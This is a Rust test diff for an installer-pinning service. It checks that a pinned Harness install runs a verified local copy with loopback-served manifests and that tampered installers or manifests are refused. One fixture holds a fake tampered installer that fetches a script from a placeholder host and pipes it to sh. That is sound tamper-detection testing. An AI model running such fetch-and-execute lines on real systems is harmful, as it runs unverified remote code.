@@ -121,7 +121,7 @@ impl Runs {
                 self.id.clone()
             } else if argv[0] == "curl" {
                 self.manifest.clone()
-            } else if line.contains(install::HARNESS_INSTALLER) {
+            } else if install::runs_installer(argv) {
                 self.installer.clone()
             } else if line.ends_with("harness version") {
                 Ok("harness 0.4.25\n".into())
@@ -549,6 +549,7 @@ fn a_pinned_manifest_with_another_sha256_is_refused() {
         "curl -fsSL --proto =https --tlsv1.2 --max-filesize 1048576 {url}"
     )));
     assert!(!runs.ran(install::HARNESS_INSTALLER), "nothing installed");
+    assert!(!runs.ran(install::PINNED_INSTALLER), "nothing installed");
 
     let lamp = Lamp::new();
     after_round(
@@ -568,8 +569,12 @@ fn a_pinned_manifest_with_another_sha256_is_refused() {
     let installer = log
         .iter()
         .rev()
-        .find(|line| line.contains(install::HARNESS_INSTALLER))
+        .find(|line| line.contains(install::PINNED_INSTALLER))
         .unwrap();
+    assert!(
+        !installer.contains(install::HARNESS_INSTALLER),
+        "{installer}"
+    );
     // The checked bytes, from lamp-update's own listener (#5229), never the
     // URL again.
     assert!(
@@ -666,7 +671,7 @@ fn the_builds_own_pin_is_served_to_the_installer_from_loopback() {
         if argv[0] == "id" {
             return Ok("990\n".into());
         }
-        if line.contains(install::HARNESS_INSTALLER) {
+        if install::runs_installer(argv) {
             let url = argv
                 .iter()
                 .find_map(|arg| arg.strip_prefix("HARNESS_METADATA_URL="))
@@ -728,6 +733,279 @@ fn a_built_in_pin_with_another_sha256_installs_nothing() {
     assert_eq!(said.error.as_deref(), Some("pin_mismatch"));
     assert!(!runs.ran("curl "));
     assert!(!runs.ran(install::HARNESS_INSTALLER));
+    assert!(!runs.ran(install::PINNED_INSTALLER));
+}
+
+/// What the installer's run was handed: its file's bytes and mode, and
+/// each `HARNESS_*` variable with what its URL served.
+type Seen = (Vec<u8>, u32, Vec<(String, String)>);
+
+/// The installer a pinned one-shot runs (#5229) is this build's checked
+/// copy, run from a file (`sh <file>`, no CDN URL, no pipe), readable by
+/// `lampos` and taken away after; every manifest it reads is a loopback
+/// URL serving the compiled-in bytes; `HARNESS_INSTALL_ATTENDED` is taken
+/// out, so its OpenCode step never runs. Both pins: the build's own and
+/// one in the environment.
+#[test]
+fn a_pinned_install_runs_the_builds_installer_from_a_file_with_every_manifest_on_loopback() {
+    let url = "https://example.invalid/harness/manifest.json";
+    let fetched_manifest = "{\"cli\":{\"version\":\"0.4.25\"}}";
+    let fetched_pin = pin_from(
+        Some(url),
+        Some(&crate::manifest::sha256_hex(fetched_manifest.as_bytes())),
+    )
+    .unwrap()
+    .unwrap();
+    for (pin, cli, want) in [
+        (
+            product::built_in(),
+            product::MANIFEST.to_vec(),
+            product::VERSION,
+        ),
+        (fetched_pin, fetched_manifest.as_bytes().to_vec(), "0.4.25"),
+    ] {
+        let lamp = Lamp::new();
+        after_round(
+            lamp.root(),
+            &lamp.records(),
+            &Ok(Some(pin.clone())),
+            &mut Fake::default(),
+            1,
+            &mut quiet(),
+        );
+        let log: Rc<RefCell<Vec<String>>> = Rc::default();
+        let seen: Rc<RefCell<Option<Seen>>> = Rc::default();
+        let file: Rc<RefCell<Option<PathBuf>>> = Rc::default();
+        let mut run = |argv: &[String]| -> Result<String, String> {
+            log.borrow_mut().push(argv.join(" "));
+            if argv[0] == "id" {
+                return Ok("990\n".into());
+            }
+            if argv[0] == "curl" {
+                return Ok(fetched_manifest.into());
+            }
+            if argv.last().is_some_and(|last| last == "version") {
+                return Ok(format!("harness {want}\n"));
+            }
+            if install::runs_installer(argv) {
+                use std::os::unix::fs::PermissionsExt;
+                let path = PathBuf::from(argv.last().unwrap());
+                let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+                let bodies = argv
+                    .iter()
+                    .filter_map(|arg| {
+                        let (name, value) = arg.split_once('=')?;
+                        name.starts_with("HARNESS_")
+                            .then(|| (name.to_owned(), fetch(value)))
+                    })
+                    .collect();
+                *seen.borrow_mut() = Some((fs::read(&path).unwrap(), mode, bodies));
+                *file.borrow_mut() = Some(path);
+            }
+            Ok(String::new())
+        };
+        let said = install_now(
+            lamp.root(),
+            &lamp.records(),
+            &mut run,
+            &mut || 2,
+            &mut quiet(),
+        )
+        .unwrap();
+        assert_eq!(said.install, "installed", "{pin:?}");
+        let log = log.borrow().clone();
+        let line = log
+            .iter()
+            .find(|line| line.contains(install::PINNED_INSTALLER))
+            .unwrap();
+        assert!(
+            line.starts_with(
+                "runuser -u lampos -- env -u HARNESS_INSTALL_ATTENDED HOME=/var/lib/lampos-tasks "
+            ),
+            "{line}"
+        );
+        assert!(!line.contains(install::HARNESS_INSTALLER), "{line}");
+        assert!(!line.contains("| sh") && !line.contains(" -c "), "{line}");
+        assert!(!line.contains("HARNESS_INSTALL_ATTENDED="), "{line}");
+        assert!(
+            !log.iter()
+                .any(|line| line.contains(install::HARNESS_INSTALLER))
+        );
+        // Only an environment pin's manifest is fetched, and nothing else.
+        let fetches: Vec<_> = log
+            .iter()
+            .filter(|line| line.starts_with("curl "))
+            .collect();
+        assert_eq!(fetches.len(), usize::from(!pin.built_in), "{fetches:?}");
+
+        let (bytes, mode, bodies) = seen.borrow_mut().take().unwrap();
+        assert_eq!(bytes, product::INSTALLER, "the build's installer ran");
+        assert_eq!(mode, 0o644, "lampos reads it, only root writes it");
+        let mut wanted = vec![("HARNESS_METADATA_URL".to_owned(), cli.clone())];
+        wanted.extend(
+            product::MANIFESTS
+                .iter()
+                .map(|manifest| (manifest.env.to_owned(), manifest.bytes.to_vec())),
+        );
+        assert_eq!(bodies.len(), wanted.len(), "{bodies:?}");
+        for ((name, body), (want_name, want)) in bodies.iter().zip(&wanted) {
+            assert_eq!(name, want_name);
+            assert!(body.starts_with("HTTP/1.1 200 OK\r\n"), "{name}: {body}");
+            assert!(body.as_bytes().ends_with(want), "{name}: {body}");
+        }
+        for name in ["HARNESS_METADATA_URL", "HARNESS_TUI_MANIFEST_URL"] {
+            assert!(
+                line.contains(&format!("{name}=http://127.0.0.1:")),
+                "{name}: {line}"
+            );
+        }
+        let path = file.borrow().clone().unwrap();
+        assert!(!path.exists(), "the installer's file is taken away after");
+        assert!(!path.parent().unwrap().exists());
+    }
+}
+
+/// Without a pin (a builder's lamp, `harness-on`), the installer is still
+/// Harness's CDN one piped to `sh`, exactly as before #5229, with nothing
+/// served and nothing taken out of its environment.
+#[test]
+fn an_unpinned_install_still_pipes_the_cdn_installer() {
+    let mut log = Vec::new();
+    let mut run = |argv: &[String]| -> Result<String, String> {
+        log.push(argv.to_vec());
+        Ok(if argv[0] == "id" {
+            "990\n".into()
+        } else {
+            String::new()
+        })
+    };
+    install::harness_on_with(&mut run, USER, HARNESS_HOME).unwrap();
+    let installer = log
+        .iter()
+        .find(|argv| install::runs_installer(argv))
+        .unwrap();
+    assert_eq!(
+        installer.join(" "),
+        format!(
+            "runuser -u lampos -- env HOME=/var/lib/lampos-tasks XDG_RUNTIME_DIR=/run/user/990 PATH=/usr/local/bin:/usr/bin:/bin SHELL=/bin/sh sh -c curl -fsSL --proto =https --tlsv1.2 {} | sh",
+            install::HARNESS_INSTALLER
+        )
+    );
+}
+
+/// The installer's bound ([`install::INSTALLER_WITHIN`]) holds for both
+/// runs: the CDN pipe and a pinned file. Other `sh` runs are not it.
+#[test]
+fn both_installer_runs_get_the_installers_bound() {
+    let argv = |words: &[&str]| {
+        words
+            .iter()
+            .map(|word| (*word).to_owned())
+            .collect::<Vec<_>>()
+    };
+    let piped = format!("curl -fsSL {} | sh", install::HARNESS_INSTALLER);
+    assert!(install::runs_installer(&argv(&[
+        "runuser", "sh", "-c", &piped
+    ])));
+    let file = format!("/tmp/lamp-update-harness-1-2/{}", install::PINNED_INSTALLER);
+    assert!(install::runs_installer(&argv(&[
+        "runuser", "env", "sh", &file
+    ])));
+    assert!(!install::runs_installer(&argv(&["sh", "/tmp/other.sh"])));
+    assert!(!install::runs_installer(&argv(&["cat", &file])));
+    assert!(!install::runs_installer(&[]));
+}
+
+/// A tampered byte in the installer or in any manifest the build pins is
+/// `pin_mismatch`: nothing is served, written or run.
+#[test]
+fn a_tampered_installer_or_manifest_installs_nothing() {
+    let mut kits = vec![Kit {
+        installer: b"#!/bin/sh\ncurl https://example.invalid/x | sh\n",
+        ..Kit::BUILT
+    }];
+    for at in 0..product::MANIFESTS.len() {
+        let mut manifests = product::MANIFESTS;
+        manifests[at].bytes = b"{\"tampered\":true}";
+        kits.push(Kit {
+            manifests,
+            ..Kit::BUILT
+        });
+    }
+    for kit in kits {
+        let lamp = Lamp::new();
+        after_round(
+            lamp.root(),
+            &lamp.records(),
+            &Ok(Some(product::built_in())),
+            &mut Fake::default(),
+            1,
+            &mut quiet(),
+        );
+        let runs = Runs::new();
+        let mut run = runs.runner();
+        let said = install_with(
+            lamp.root(),
+            &lamp.records(),
+            &mut run,
+            &mut || 2,
+            &mut quiet(),
+            &kit,
+        )
+        .unwrap();
+        assert_eq!(said.error.as_deref(), Some("pin_mismatch"));
+        let log = runs.log.borrow().clone();
+        assert!(
+            !log.iter()
+                .any(|line| line.starts_with("runuser") || line.starts_with("install ")),
+            "{log:?}"
+        );
+    }
+}
+
+/// A listener lamp-update cannot make on 127.0.0.1 is `serve`, not
+/// `installer` (#5229's reader): nothing runs, and the next round tries
+/// again at once, with no [`RETRY_AFTER`] wait.
+#[test]
+fn a_listener_not_made_is_serve_and_tried_at_the_next_round() {
+    let kit = Kit {
+        bind: || Err(io::Error::new(ErrorKind::AddrNotAvailable, "no loopback")),
+        ..Kit::BUILT
+    };
+    let lamp = Lamp::new();
+    let mut systemd = Fake::default();
+    let pin = Ok(Some(product::built_in()));
+    after_round(
+        lamp.root(),
+        &lamp.records(),
+        &pin,
+        &mut systemd,
+        1,
+        &mut quiet(),
+    );
+    let runs = Runs::new();
+    let mut run = runs.runner();
+    let said = install_with(
+        lamp.root(),
+        &lamp.records(),
+        &mut run,
+        &mut || 10 * MINUTE_MS,
+        &mut quiet(),
+        &kit,
+    )
+    .unwrap();
+    assert_eq!(said.error.as_deref(), Some("serve"));
+    assert!(said.check(), "lamp-cloud passes it");
+    assert!(!runs.ran("runuser"), "nothing ran");
+    let next = after_round(
+        lamp.root(),
+        &lamp.records(),
+        &pin,
+        &mut systemd,
+        11 * MINUTE_MS,
+        &mut quiet(),
+    );
+    assert_eq!(next.unwrap().install, "installing", "not held");
 }
 
 /// A `GET` of `url` on loopback, the whole answer.
@@ -740,4 +1018,85 @@ fn fetch(url: &str) -> String {
     let mut said = String::new();
     stream.read_to_string(&mut said).unwrap();
     said
+}
+
+/// A pinned install whose `harness version` is not the pinned one (or says
+/// none) is recorded `failed` with `version`, not `installed` (#5229's
+/// reader), so the app tells it apart; it stays so at the next rounds while
+/// Harness is there, and is never held by [`RETRY_AFTER`].
+#[test]
+fn a_pinned_install_reporting_another_version_records_version() {
+    for answer in [
+        Ok("harness 0.5.40\n".to_owned()),
+        Err("exit status: 1".to_owned()),
+    ] {
+        let lamp = Lamp::new();
+        let mut systemd = Fake::default();
+        let pin = Ok(Some(product::built_in()));
+        after_round(
+            lamp.root(),
+            &lamp.records(),
+            &pin,
+            &mut systemd,
+            1,
+            &mut quiet(),
+        );
+        let log: Rc<RefCell<Vec<String>>> = Rc::default();
+        let mut run = |argv: &[String]| -> Result<String, String> {
+            log.borrow_mut().push(argv.join(" "));
+            if argv[0] == "id" {
+                Ok("990\n".into())
+            } else if argv.last().is_some_and(|last| last == "version") {
+                answer.clone()
+            } else {
+                Ok(String::new())
+            }
+        };
+        let mut lines = Vec::new();
+        let said = install_now(
+            lamp.root(),
+            &lamp.records(),
+            &mut run,
+            &mut || 2,
+            &mut |line: &str| lines.push(line.to_owned()),
+        )
+        .unwrap();
+        assert_eq!(
+            (said.install.as_str(), said.error.as_deref(), said.pinned),
+            ("failed", Some("version"), Some(true)),
+            "{answer:?}"
+        );
+        assert!(said.check(), "lamp-cloud passes it");
+        assert_ne!(said.install, "installed");
+        assert!(
+            lines
+                .iter()
+                .any(|line| line.ends_with(&format!(", not the pinned {}", product::VERSION))),
+            "{lines:?}"
+        );
+        // Harness is there: the next round keeps `version`, starting nothing.
+        lamp.harness_there();
+        let next = after_round(
+            lamp.root(),
+            &lamp.records(),
+            &pin,
+            &mut systemd,
+            3,
+            &mut quiet(),
+        );
+        assert_eq!(next, None);
+        assert_eq!(lamp.said().unwrap().error.as_deref(), Some("version"));
+        assert_eq!(systemd.asked.iter().filter(|a| **a == "start").count(), 1);
+    }
+    // Unpinned, no version is pinned, so any is `installed`.
+    let lamp = Lamp::new();
+    after_round(
+        lamp.root(),
+        &lamp.records(),
+        &Ok(None),
+        &mut Fake::default(),
+        1,
+        &mut quiet(),
+    );
+    assert_eq!(install(&lamp, &Runs::new(), 2).install, "installed");
 }
